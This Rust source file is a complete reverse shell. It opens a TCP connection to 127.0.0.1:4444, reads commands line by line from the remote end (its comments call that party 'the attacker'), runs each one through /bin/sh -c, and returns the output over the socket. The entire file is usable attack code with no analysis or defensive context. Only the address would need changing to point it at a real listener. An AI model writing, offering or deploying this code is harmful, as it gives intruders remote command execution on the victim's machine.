use std::io::{BufRead, BufReader, Write}; // specific imports are cleaner
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    // 1. Establish connection
    let stream = match TcpStream::connect("127.0.0.1:4444") {
        Ok(s) => s,
        Err(e) => {
            eprintln!("Failed to connect: {}", e);
            return Err(e);
        }
    };

    // 2. Clone the handle for writing
    // We clone the internal socket reference so we can read and write independently
    let mut stream_writer = stream.try_clone()?;
    
    // 3. Wrap the ORIGINAL stream in a BufReader for easy line reading
    let mut reader = BufReader::new(&stream);

    loop {
        let mut cmd = String::new();
        // Read until the attacker hits Enter
        match reader.read_line(&mut cmd) {
            Ok(0) => break, // EOF (Connection closed)
            Ok(_) => {
                let cmd = cmd.trim();
                // Skip empty commands (just hitting enter)
                if cmd.is_empty() { continue; }

                let output = Command::new("/bin/sh")
                    .arg("-c")
                    .arg(cmd)
                    .output();

                match output {
                    Ok(out) => {
                        // Write directly to the stream (no BufWriter needed)
                        stream_writer.write_all(&out.stdout)?;
                        stream_writer.write_all(&out.stderr)?;
                        // No need to flush usually, but good practice to ensure it sends NOW
                        stream_writer.flush()?; 
                    }
                    Err(e) => {
                        // If the process failed to start (e.g., /bin/sh missing)
                        let error_msg = format!("Failed to execute: {}\n", e);
                        stream_writer.write_all(error_msg.as_bytes())?;
                    }
                }
            }
            Err(e) => {
                eprintln!("Connection error: {}", e);
                break;
            }
        }
    }
    Ok(())
}